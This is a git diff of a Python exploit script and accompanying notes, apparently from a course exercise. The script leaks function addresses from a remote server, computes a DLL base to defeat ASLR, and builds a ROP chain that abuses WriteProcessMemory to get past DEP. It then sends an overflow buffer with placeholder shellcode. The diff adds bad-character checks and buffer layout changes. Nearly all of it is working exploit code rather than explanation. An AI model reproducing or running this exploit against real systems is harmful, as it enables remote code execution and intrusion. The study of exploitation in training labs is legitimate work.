@@ -165,10 +165,10 @@ after code caves we can abuse WPM to copy our shellcode from the overflown opCod
 buffer to an executable page in memory
 
 WPM takes
-- hProcess 			<- Set to -1, stay within currentProc
-- lpBaseAddress			<- Addr to write to (BaseAddr + Offset)
-- lpBuffer			<- Shellcode stack Addr
-- nSize				<- Shellcode Size
+- hProcess 			        <- Set to -1, stay within currentProc
+- lpBaseAddress			    <- Addr to write to (BaseAddr + Offset)
+- lpBuffer			        <- Shellcode stack Addr
+- nSize				        <- Shellcode Size
 - lpNumberOfBytesWritten	<- DWORD in the .data section
 
 
@@ -176,6 +176,10 @@ Now ROP gadgets have to be offset based
 to get image base
 baseDLLAddr + 3c -> PE Header
 baseDLLAddr + PEHeader + 34 -> ImageBase
+
+
+0253_03242026:
+
 
 =============================================================================
 
@@ -185,14 +189,26 @@ import socket
 import sys
 from struct import pack
 
-from colorama import Fore, Style, init
+from colorama import Back, Fore, Style, init
 from modules.msfvenom_module import generatePayload
 from numpy import byte
 from rpyc import lib
+from win32comext import shell
 
 DEBUG = True
-
+BASE_ADDR_BAD = False
 init()
+
+
+bad_chars = [0x00, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x20]
+
+
+def checkBadChars(data):
+    # Iterate over bytes in the data and check for bad characters
+    for byte in data:
+        if byte in bad_chars:
+            return True
+    return False
 
 
 def sendMalBuff(buf, socketTup):
@@ -201,6 +217,10 @@ def sendMalBuff(buf, socketTup):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.settimeout(timeout_seconds)
             s.connect(socketTup)
+
+            # Check buffer for bad chars
+            if checkBadChars(buf):
+                print(Fore.RED + Back.WHITE + "[WARN] Buffer contains bad characters" + Style.RESET_ALL)
 
             # Send the buffer to the server
             s.sendall(buf)
@@ -226,16 +246,16 @@ def sendMalBuff(buf, socketTup):
                     break
 
             if not response:
-                print(Fore.RED + "[-] No response received from server" + Style.RESET_ALL)
+                print(Fore.RED + "[!] No response received from server" + Style.RESET_ALL)
                 sys.exit(1)
 
             return response
 
     except socket.timeout:
-        print(Fore.RED + "[-] Socket operation timed out" + Style.RESET_ALL)
+        print(Fore.RED + "[!] Socket operation timed out" + Style.RESET_ALL)
         sys.exit(1)
     except socket.error as error:
-        print(Fore.RED + f"[-] Socket error: {error}" + Style.RESET_ALL)
+        print(Fore.RED + f"[!] Socket error: {error}" + Style.RESET_ALL)
         sys.exit(1)
 
 
@@ -275,10 +295,10 @@ def leakFunctionAddress(func, socketTup):
         print(Fore.GREEN + f"o Leaked {func.decode('utf-8').strip(chr(0))}: {Fore.LIGHTYELLOW_EX} 0x{functionAddress:08x}" + Style.RESET_ALL)
 
         if functionAddress == 1:
-            print(Fore.RED + f"[-] Failed to leak address for {func.decode('utf-8').strip(chr(0))}" + Style.RESET_ALL)
+            print(Fore.RED + f"[!] Failed to leak address for {func.decode('utf-8').strip(chr(0))}" + Style.RESET_ALL)
             sys.exit(1)
     else:
-        print(Fore.RED + f"[-] No response received from server when leaking {func.decode('utf-8').strip(chr(0))}" + Style.RESET_ALL)
+        print(Fore.RED + f"[!] No response received from server when leaking {func.decode('utf-8').strip(chr(0))}" + Style.RESET_ALL)
         sys.exit(1)
     # Return the address only
     return functionAddress
@@ -310,18 +330,31 @@ def printBuffer(buf, width="db"):
             if width == "db":
                 for j in range(w):
                     if start + j < len(buf):
-                        print(f"{buf[start+j]:02x}", end=" ")
+                        byte_val = buf[start + j]
+                        if byte_val in bad_chars:
+                            print(f"{Fore.RED}{Back.WHITE}{byte_val:02x}{Style.RESET_ALL}", end=" ")
+                        else:
+                            print(f"{byte_val:02x}", end=" ")
                     else:
                         print("  ", end="")
             else:
                 val = 0
+                bad_in_group = False
                 for j in range(w):
                     if start + j < len(buf):
                         val |= buf[start + j] << (8 * (w - 1 - j))
+                        if buf[start + j] in bad_chars:
+                            bad_in_group = True
                 if width == "dw":
-                    print(f"{val:04x}", end=" ")
+                    if bad_in_group:
+                        print(f"{Fore.RED}{Back.WHITE}{val:04x}{Style.RESET_ALL}", end=" ")
+                    else:
+                        print(f"{val:04x}", end=" ")
                 elif width == "dd":
-                    print(f"{val:08x}", end=" ")
+                    if bad_in_group:
+                        print(f"{Fore.RED}{Back.WHITE}{val:08x}{Style.RESET_ALL}", end=" ")
+                    else:
+                        print(f"{val:08x}", end=" ")
         # Add ASCII representation
         print(" ", end="")
         for j in range(bytes_per_line):
@@ -345,7 +378,7 @@ def parseResponse(response):
         if line.find(pattern) != -1:
             address = int((line.split(pattern)[-1].strip()), 16)
     if not address:
-        print("[-] Could not find the address in the Response")
+        print("[!] Could not find the address in the Response")
         sys.exit()
     return address
 
@@ -371,6 +404,8 @@ def main():
         # Leak addresses of functions
         for func in functions:
             leakedAddresses.append(leakFunctionAddress(func, (server, port)))
+            if checkBadChars(pack("<L", leakedAddresses[-1])):
+                BASE_ADDR_BAD = True
 
         WPMAddr = leakedAddresses[1]  # WriteProcessMemory address
         exportedFunc = leakedAddresses[0]  # N98E_CRYPTO_get_new_lockid address
@@ -486,22 +521,39 @@ def main():
         rop += pack("<L", (0x42424242))  # junk for ret 0x10
         rop += pack("<L", (0x42424242))  # junk for ret 0x10
 
-        # 1803_1057:
+        # 18032026_1057:
         # Align ESP with ROP Skeleton
         # EAX points 0x14 bytes ahead of WPM on stack
-        # This will jump my flow straight up towards the WPM address call
+        # This will jump EIP back straight up towards the WPM address call
         rop += pack("<L", (libraryBase + 0x117C))  # pop ecx ; ret
         rop += pack("<L", (0xFFFFFFEC))  # -0x14
         rop += pack("<L", (libraryBase + 0x1D0F0))  # add eax, ecx ; ret
         rop += pack("<L", (libraryBase + 0x5B415))  # xchg eax, esp ; ret
 
+        # 0257_03242026:
+        # Start of 11.4.2
+        # alr know meterpreter shellcode wont run here, just reading through all this
+        # REASON:: mfsvenom uses a Encoder/Decoder to avoid badchars. This requires the use of writeable memory
+        #          which is not available in this case as WPM restores the default protections which were read/exec
+        offset2 = b"C" * 0x6C  # This was calculated by subtracting lpBuffer address to the end of our ROP chain
+        shellcode = b"\x90" * 0x100
+
         # Padding (Followed the vid)
-        padding = b"D" * (0x600 - 276 - 4 - len(rop))
+        padding = b"D" * (0x600 - 276 - 4 - len(rop) - len(offset2) - len(shellcode))
 
         # Prepare buffer + add checksum
-        buffer = offset + wpm + eip + rop + padding
+        buffer = offset + wpm + eip + rop + offset2 + shellcode + padding
         buf += b"File: %s From: %d To: %d ChunkLoc: %d FileLoc: %d" % (buffer, 0, 0, 0, 0)
         buf = pack(">i", len(buf) - 4) + buf  # Checksum DWORD        0x00 - 0x04
+
+        # Warn Base Address(es) might be bad
+        if BASE_ADDR_BAD:
+            print(
+                Fore.RED
+                + Back.WHITE
+                + "[WARN] One or more leaked addresses contain bad characters, base address calculations may be incorrect"
+                + Style.RESET_ALL
+            )
 
         # Send Final Buffer
         print(f"{Fore.CYAN}o Sending final buffer...{Style.RESET_ALL}")
